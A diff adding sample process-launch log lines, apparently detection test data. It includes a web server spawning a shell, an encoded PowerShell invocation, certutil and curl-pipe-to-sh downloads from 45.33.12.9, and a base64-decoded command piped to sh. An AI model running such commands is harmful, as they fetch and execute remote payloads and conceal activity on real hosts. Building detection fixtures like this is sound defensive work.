@@ -1,0 +1,7 @@
+2026-08-30T03:12:00 host=web01 parent=bash child=ls pid=4001 cmd="ls -la /var/www"
+2026-08-30T03:14:22 host=web01 parent=nginx child=/bin/bash pid=4110 cmd="/bin/bash -c 'id; whoami'"
+2026-08-30T22:30:05 host=win-fs01 parent=cmd.exe child=powershell.exe pid=5566 cmd="powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
+2026-08-30T22:31:15 host=win-fs01 parent=explorer.exe child=cmd.exe pid=5567 cmd="cmd.exe /c certutil.exe -urlcache -split -f http://45.33.12.9/payload.exe C:\\Windows\\Temp\\p.exe"
+2026-08-30T22:33:40 host=web01 parent=bash child=bash pid=5568 cmd="curl http://45.33.12.9/install.sh | sh"
+2026-08-30T22:34:05 host=web01 parent=cron child=bash pid=5570 cmd="echo c3VkbyByZXNldA== | base64 -d | sh"
+2026-08-30T09:00:00 host=web01 parent=systemd child=nginx pid=100 cmd="nginx -g 'daemon off;'"
